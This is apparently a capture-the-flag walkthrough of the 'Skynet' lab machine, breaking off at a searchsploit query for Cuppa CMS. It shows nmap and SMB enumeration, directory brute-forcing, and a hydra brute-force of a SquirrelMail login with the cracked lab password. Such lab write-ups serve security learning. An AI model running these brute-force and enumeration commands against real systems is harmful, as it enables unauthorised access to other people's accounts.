## Skynet

| Linux machine

`export ip=10.10.12.141`

-----------------------------------------

### Nmap

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet]
└─$ nmap -sC -sV -oN nmap/initial $ip
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 21:51 IST
Nmap scan report for 10.10.12.141
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP PIPELINING CAPA UIDL RESP-CODES AUTH-RESP-CODE SASL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 LOGIN-REFERRALS more OK capabilities listed post-login Pre-login ENABLE ID LITERAL+ have SASL-IR IDLE IMAP4rev1
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-05-11T11:22:20-05:00
| smb2-time: 
|   date: 2024-05-11T16:22:20
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.88 seconds
```

### Initial Access

Try directory bruteforce in feroxbuster

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet]                                                                                                             
└─$ feroxbuster -u http://10.10.12.141/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___                                                                                                           
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                            
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                           
by Ben "epi" Risher 🤓                 ver: 2.10.2                                                                                                           
───────────────────────────┬──────────────────────                                                                                                           
 🎯  Target Url            │ http://10.10.12.141/                                                                                                            
 🚀  Threads               │ 50                                                                                                                              
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt                                                                     
 👌  Status Codes          │ All Status Codes!                                                                                                               
 💥  Timeout (secs)        │ 7                                                                                                                               
 🦡  User-Agent            │ feroxbuster/2.10.2                                                                                                              
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                              
 🔎  Extract Links         │ true                                                                                                                            
 🏁  HTTP methods          │ [GET]                                                                                                                           
 🔃  Recursion Depth       │ 4                                                                                                                               
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest                                                                           
───────────────────────────┴──────────────────────                                                                                                           
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                                                          
──────────────────────────────────────────────────                                                                                                           
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      159l      221w     2667c http://10.10.12.141/style.css
200      GET      144l      598w    44162c http://10.10.12.141/image.png
301      GET        9l       28w      312c http://10.10.12.141/admin => http://10.10.12.141/admin/
200      GET       18l       43w      523c http://10.10.12.141/
301      GET        9l       28w      310c http://10.10.12.141/css => http://10.10.12.141/css/
301      GET        9l       28w      309c http://10.10.12.141/js => http://10.10.12.141/js/
301      GET        9l       28w      313c http://10.10.12.141/config => http://10.10.12.141/config/
301      GET        9l       28w      309c http://10.10.12.141/ai => http://10.10.12.141/ai/
301      GET        9l       28w      315c http://10.10.12.141/ai/notes => http://10.10.12.141/ai/notes/
301      GET        9l       28w      319c http://10.10.12.141/squirrelmail => http://10.10.12.141/squirrelmail/
301      GET        9l       28w      326c http://10.10.12.141/squirrelmail/images => http://10.10.12.141/squirrelmail/images/
301      GET        9l       28w      323c http://10.10.12.141/squirrelmail/src => http://10.10.12.141/squirrelmail/src/
301      GET        9l       28w      326c http://10.10.12.141/squirrelmail/themes => http://10.10.12.141/squirrelmail/themes/
301      GET        9l       28w      327c http://10.10.12.141/squirrelmail/plugins => http://10.10.12.141/squirrelmail/plugins/
301      GET        9l       28w      326c http://10.10.12.141/squirrelmail/config => http://10.10.12.141/squirrelmail/config/
301      GET        9l       28w      336c http://10.10.12.141/squirrelmail/plugins/calendar => http://10.10.12.141/squirrelmail/plugins/calendar/
301      GET        9l       28w      330c http://10.10.12.141/squirrelmail/themes/css => http://10.10.12.141/squirrelmail/themes/css/
301      GET        9l       28w      332c http://10.10.12.141/squirrelmail/plugins/test => http://10.10.12.141/squirrelmail/plugins/test/
200      GET       27l       70w      505c http://10.10.12.141/squirrelmail/plugins/test/README
200      GET       13l       55w      360c http://10.10.12.141/squirrelmail/plugins/test/INSTALL
301      GET        9l       28w      337c http://10.10.12.141/squirrelmail/plugins/translate => http://10.10.12.141/squirrelmail/plugins/translate/
301      GET        9l       28w      335c http://10.10.12.141/squirrelmail/plugins/filters => http://10.10.12.141/squirrelmail/plugins/filters/
200      GET       58l      242w     1730c http://10.10.12.141/squirrelmail/plugins/translate/README
200      GET       52l      430w     2672c http://10.10.12.141/squirrelmail/plugins/filters/README
301      GET        9l       28w      335c http://10.10.12.141/squirrelmail/plugins/fortune => http://10.10.12.141/squirrelmail/plugins/fortune/
200      GET       11l       72w      485c http://10.10.12.141/squirrelmail/plugins/fortune/README
301      GET        9l       28w      341c http://10.10.12.141/squirrelmail/plugins/administrator => http://10.10.12.141/squirrelmail/plugins/administrator/
301      GET        9l       28w      335c http://10.10.12.141/squirrelmail/plugins/spamcop => http://10.10.12.141/squirrelmail/plugins/spamcop/
200      GET       31l      191w     1159c http://10.10.12.141/squirrelmail/plugins/administrator/INSTALL
200      GET       51l      200w     1261c http://10.10.12.141/squirrelmail/plugins/spamcop/README
[#####>--------------] - 12m   489126/1840713 24m     found:30      errors:61094  
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_12_141_-1715445430.state ...
[#####>--------------] - 12m   489135/1840713 24m     found:30      errors:61094  
[#########>----------] - 12m    39485/87650   56/s    http://10.10.12.141/ 
[#########>----------] - 12m    40865/87650   58/s    http://10.10.12.141/admin/ 
[########>-----------] - 12m    39046/87650   56/s    http://10.10.12.141/css/ 
[########>-----------] - 12m    38610/87650   55/s    http://10.10.12.141/js/ 
[########>-----------] - 12m    35593/87650   51/s    http://10.10.12.141/config/ 
[########>-----------] - 11m    36422/87650   53/s    http://10.10.12.141/ai/ 
[#######>------------] - 11m    34794/87650   52/s    http://10.10.12.141/ai/notes/ 
[####>---------------] - 8m     21162/87650   42/s    http://10.10.12.141/squirrelmail/ 
[####>---------------] - 8m     20978/87650   41/s    http://10.10.12.141/squirrelmail/images/ 
[####>---------------] - 8m     20225/87650   40/s    http://10.10.12.141/squirrelmail/themes/ 
[###>----------------] - 8m     17214/87650   35/s    http://10.10.12.141/squirrelmail/plugins/ 
[####>---------------] - 8m     20116/87650   41/s    http://10.10.12.141/squirrelmail/src/ 
[####>---------------] - 8m     18120/87650   37/s    http://10.10.12.141/squirrelmail/config/ 
[####>---------------] - 8m     17544/87650   37/s    http://10.10.12.141/squirrelmail/plugins/calendar/ 
[###>----------------] - 8m     15163/87650   32/s    http://10.10.12.141/squirrelmail/themes/css/ 
[###>----------------] - 8m     16206/87650   35/s    http://10.10.12.141/squirrelmail/plugins/test/ 
[###>----------------] - 7m     13713/87650   34/s    http://10.10.12.141/squirrelmail/plugins/translate/ 
[###>----------------] - 7m     14188/87650   36/s    http://10.10.12.141/squirrelmail/plugins/filters/ 
[##>-----------------] - 6m     11015/87650   32/s    http://10.10.12.141/squirrelmail/plugins/fortune/ 
[##>-----------------] - 5m     10632/87650   35/s    http://10.10.12.141/squirrelmail/plugins/administrator/ 
[#>------------------] - 4m      7845/87650   31/s    http://10.10.12.141/squirrelmail/plugins/spamcop/                 
```

Directory bruteforce discovers the **squirellmail installed and it has login page** - Trying default password doesn't works..

Enumerate Samba shares using nmap NSE

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet]
└─$ nmap --script=*smb* -sV -oN nmap/smbscan $ip                                                                                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-11 22:16 IST
Nmap scan report for 10.10.12.141
Host is up (0.17s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-mbenum: 
|   DFS Root
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Master Browser
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Print server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Server service
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Unix server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Windows NT/2000/XP/2003 server
|     SKYNET  0.0  skynet server (Samba, Ubuntu)
|   Workstation
|_    SKYNET  0.0  skynet server (Samba, Ubuntu)
| smb-enum-domains: 
|   SKYNET
|     Groups: n/a
|     Users: milesdyson
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|     Account lockout disabled
|   Builtin
|     Groups: n/a
|     Users: n/a
|     Creation time: unknown
|     Passwords: min length: 5; min age: n/a days; max age: n/a days; history: n/a passwords
|_    Account lockout disabled
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
|_smb-vuln-ms10-054: false
|_smb-print-text: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
| smb2-time: 
|   date: 2024-05-11T16:47:24
|_  start_date: N/A
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Multi-credit operations
|   3:0:0: 
|     Distributed File System
|     Multi-credit operations
|   3:0:2: 
|     Distributed File System
|     Multi-credit operations
|   3:1:1: 
|     Distributed File System
|_    Multi-credit operations
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_smb-vuln-ms10-061: false
| smb-brute: 
|_  No accounts found
|_smb-flood: ERROR: Script execution failed (use -d to debug)
| smb-enum-users: 
|   SKYNET\milesdyson (RID: 1000)
|     Full name:   
|     Description: 
|_    Flags:       Normal user account
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-enum-sessions: 
|_  <nobody>
| smb-ls: Volume \\10.10.12.141\anonymous
| SIZE   TIME                 FILENAME
| <DIR>  2020-11-26T16:04:00  .
| <DIR>  2019-09-17T07:20:17  ..
| 163    2019-09-18T03:04:59  attention.txt
| <DIR>  2019-09-18T04:42:16  logs
| 0      2019-09-18T04:42:13  logs\log2.txt
| 471    2019-09-18T04:41:59  logs\log1.txt
| 0      2019-09-18T04:42:16  logs\log3.txt
|_
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-05-11T11:52:32-05:00
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.12.141\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (skynet server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.12.141\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: Skynet Anonymous Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\srv\samba
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.12.141\milesdyson: 
|     Type: STYPE_DISKTREE
|     Comment: Miles Dyson Personal Share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\milesdyson\share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.12.141\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|     2:1:0
|     3:0:0
|     3:0:2
|_    3:1:1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 448.84 seconds
```

**(OR)**

Enumerate Samba shares using smbmap

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet]
└─$ smbmap -H 10.10.12.141                                                                                                                                   

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                

[+] IP: 10.10.12.141:445        Name: 10.10.12.141              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY       Skynet Anonymous Share
        milesdyson                                              NO ACCESS       Miles Dyson Personal Share
        IPC$                                                    NO ACCESS       IPC Service (skynet server (Samba, Ubuntu))
```

> It has anonymous login 

Login using smbclient and get the files

```
Password for [WORKGROUP\edith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 21:34:00 2020
  ..                                  D        0  Tue Sep 17 12:50:17 2019
  attention.txt                       N      163  Wed Sep 18 08:34:59 2019
  logs                                D        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5782064 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 10:12:16 2019
  ..                                  D        0  Thu Nov 26 21:34:00 2020
  log2.txt                            N        0  Wed Sep 18 10:12:13 2019
  log1.txt                            N      471  Wed Sep 18 10:11:59 2019
  log3.txt                            N        0  Wed Sep 18 10:12:16 2019

                9204224 blocks of size 1024. 5782060 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

Files present in it states that all passwords are changed after system malfunction and it has lot of words in files (**_Seems like password_**) - **Bruteforce using hydra**

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet/logs]
└─$ hydra -l milesdyson -P log1.txt 10.10.12.141 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=incorrect" -V
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 22:48:03
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.12.141:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=incorrect
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "cyborg007haloterminator" - 1 of 31 [child 0] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator22596" - 2 of 31 [child 1] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator219" - 3 of 31 [child 2] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator20" - 4 of 31 [child 3] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator1989" - 5 of 31 [child 4] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator1988" - 6 of 31 [child 5] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator168" - 7 of 31 [child 6] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator16" - 8 of 31 [child 7] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator143" - 9 of 31 [child 8] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator13" - 10 of 31 [child 9] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator123!@#" - 11 of 31 [child 10] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator1056" - 12 of 31 [child 11] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator101" - 13 of 31 [child 12] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator10" - 14 of 31 [child 13] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator02" - 15 of 31 [child 14] (0/0)
[ATTEMPT] target 10.10.12.141 - login "milesdyson" - pass "terminator00" - 16 of 31 [child 15] (0/0)
[80][http-post-form] host: 10.10.12.141   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 22:48:15
```

Try this password for login page we found in squirellmail - it worked

![](/home/edith/pwn/vuln_machines/skynet/001.png)

On checking the emails, found password for milesdyson share

![](/home/edith/pwn/vuln_machines/skynet/002.png)

> Trying the same in ssh - doesn't worked!

Access the milesdyson share :

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet]
└─$ smbclient //10.10.12.141/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 14:35:47 2019
  ..                                  D        0  Wed Sep 18 09:21:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:35:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:35:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:35:14 2019
  notes                               D        0  Tue Sep 17 14:48:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:35:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:35:14 2019

                9204224 blocks of size 1024. 5781912 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 14:48:40 2019
  ..                                  D        0  Tue Sep 17 14:35:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 14:31:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 14:31:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 14:31:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 14:31:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 14:31:29 2019
  important.txt                       N      117  Tue Sep 17 14:48:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 14:31:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 14:31:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 14:31:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 14:31:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 14:31:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 14:31:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 14:31:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 14:31:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 14:31:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 14:31:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 14:31:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 14:31:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 14:31:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 14:31:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 14:31:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 14:31:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 14:31:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 14:31:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 14:31:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 14:31:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 14:31:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 14:31:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 14:31:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 14:31:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 14:31:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 14:31:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 14:31:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 14:31:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 14:31:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 14:31:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 14:31:29 2019

                9204224 blocks of size 1024. 5781912 blocks available
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit
```

Found the hidden directory in important.txt - **/45kra24zxs28v3yd**

**Directory bruteforce on new URI**

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/skynet]
└─$ feroxbuster -u http://10.10.12.141/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.12.141/45kra24zxs28v3yd/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       85l      462w    41537c http://10.10.12.141/45kra24zxs28v3yd/miles.jpg
200      GET       15l       57w      418c http://10.10.12.141/45kra24zxs28v3yd/
301      GET        9l       28w      337c http://10.10.12.141/45kra24zxs28v3yd/administrator => http://10.10.12.141/45kra24zxs28v3yd/administrator/
301      GET        9l       28w      343c http://10.10.12.141/45kra24zxs28v3yd/administrator/media => http://10.10.12.141/45kra24zxs28v3yd/administrator/media/
301      GET        9l       28w      344c http://10.10.12.141/45kra24zxs28v3yd/administrator/alerts => http://10.10.12.141/45kra24zxs28v3yd/administrator/alerts/
301      GET        9l       28w      347c http://10.10.12.141/45kra24zxs28v3yd/administrator/templates => http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/
301      GET        9l       28w      340c http://10.10.12.141/45kra24zxs28v3yd/administrator/js => http://10.10.12.141/45kra24zxs28v3yd/administrator/js/
301      GET        9l       28w      360c http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/html => http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/html/
301      GET        9l       28w      355c http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default => http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/
301      GET        9l       28w      359c http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/css => http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/css/
301      GET        9l       28w      362c http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/images => http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/images/
301      GET        9l       28w      348c http://10.10.12.141/45kra24zxs28v3yd/administrator/components => http://10.10.12.141/45kra24zxs28v3yd/administrator/components/
301      GET        9l       28w      345c http://10.10.12.141/45kra24zxs28v3yd/administrator/classes => http://10.10.12.141/45kra24zxs28v3yd/administrator/classes/
301      GET        9l       28w      359c http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/swf => http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/swf/
301      GET        9l       28w      349c http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce => http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/
301      GET        9l       28w      356c http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/themes => http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/themes/
301      GET        9l       28w      357c http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins => http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/plugins/
301      GET        9l       28w      355c http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/utils => http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/utils/
[#####>--------------] - 7m    256475/876555  13m     found:18      errors:15360  
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_10_12_141_45kra24zxs28v3yd_-1715450017.state ...
[#####>--------------] - 7m    256479/876555  13m     found:18      errors:15362  
[#######>------------] - 7m     33207/87650   84/s    http://10.10.12.141/45kra24zxs28v3yd/ 
[######>-------------] - 6m     27994/87650   76/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/ 
[######>-------------] - 6m     26638/87650   72/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/media/ 
[######>-------------] - 6m     28767/87650   79/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/alerts/ 
[######>-------------] - 6m     27829/87650   76/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/ 
[######>-------------] - 6m     27012/87650   74/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/templates/default/ 
[#####>--------------] - 6m     25374/87650   70/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/js/ 
[######>-------------] - 6m     26832/87650   74/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/components/ 
[#####>--------------] - 6m     25302/87650   71/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/classes/ 
[#>------------------] - 2m      7398/87650   72/s    http://10.10.12.141/45kra24zxs28v3yd/administrator/js/tiny_mce/              
```

![](/home/edith/pwn/vuln_machines/skynet/003.png)

We see Cuppa CMS login page..

I. Trying default credentials - 

II. Checking for open exploit

```
└─$ searchsploit cuppa cms                                                                                                                                   
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path

